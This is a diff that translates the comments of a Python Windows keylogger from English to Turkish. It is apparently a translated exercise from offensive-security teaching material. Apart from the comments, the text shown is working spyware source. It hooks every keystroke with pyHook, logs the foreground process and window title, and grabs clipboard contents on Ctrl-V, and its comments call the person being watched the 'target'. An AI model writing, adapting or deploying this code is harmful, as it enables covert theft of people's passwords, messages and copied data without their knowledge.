@@ -10,27 +10,27 @@ current_window = None
 
 
 def get_current_process():
-    # get a handle to the foreground window
+    # ön plan penceresini tanımla
     hwnd = user32.GetForegroundWindow()
 
-    # find the process ID
+    # process ID'yi bul
     pid = c_ulong(0)
     user32.GetWindowThreadProcessId(hwnd, byref(pid))
 
-    # store the current process ID
+    # geçerli process ID'yi tut
     process_id = "%d" % pid.value
 
-    # grab the executable
+    # çalıştırılabilir dosyayı al
     executable = create_string_buffer(b'\x00' * 512)
     h_process = kernel32.OpenProcess(0x400 | 0x10, False, pid)
 
     psapi.GetModuleBaseNameA(h_process, None, byref(executable), 512)
 
-    # now read it's title
+    # şimdi başlığını oku
     window_title = create_string_buffer(b'\x00' * 512)
     length = user32.GetWindowTextA(hwnd, byref(window_title), 512)
 
-    # print out the header if we're in the right process
+    # doğru işlemdeysek başlığı yazdır
     print()
     print("[ PID: %s - %s - %s ]" % (process_id,
                                      executable.value,
@@ -38,7 +38,7 @@ def get_current_process():
           )
     print()
 
-    # close handles
+    # handle'ları kapat
     kernel32.CloseHandle(hwnd)
     kernel32.CloseHandle(h_process)
 
@@ -46,17 +46,17 @@ def get_current_process():
 def KeyStroke(event):
     global current_window
 
-    # check to see if target changed windows
+    # hedefin pencereleri değiştirip değiştirmediğini kontrol edin
     if event.WindowName != current_window:
         current_window = event.WindowName
         get_current_process()
 
-    # if they pressed a standard key
+    # standart bir tuşa basarlarsa
     if 32 < event.Ascii < 127:
         print(chr(event.Ascii), end=' ')
     else:
-        # if [Ctrl-V], get the value on the clipboard
-        # added by Dan Frisch 2014
+        # [Ctrl-V] basılırsa, Dan Frisch 2014
+        # tarafından eklenen panodaki değeri alın
         if event.Key == "V":
             win32clipboard.OpenClipboard()
             pasted_value = win32clipboard.GetClipboardData()
@@ -65,14 +65,14 @@ def KeyStroke(event):
         else:
             print("[%s]" % event.Key, end=' ')
 
-    # pass execution to next hook registered 
+    # işlemi, kaydedilen bir sonraki hook'a geçir
     return True
 
 
-# create and register a hook manager
+# bir hook manager oluşturun ve kaydedin
 kl = pyHook.HookManager()
 kl.KeyDown = KeyStroke
 
-# register the hook and execute forever
+# hook'u kaydedin ve sonsuza kadar çalıştırın
 kl.HookKeyboard()
 pythoncom.PumpMessages()
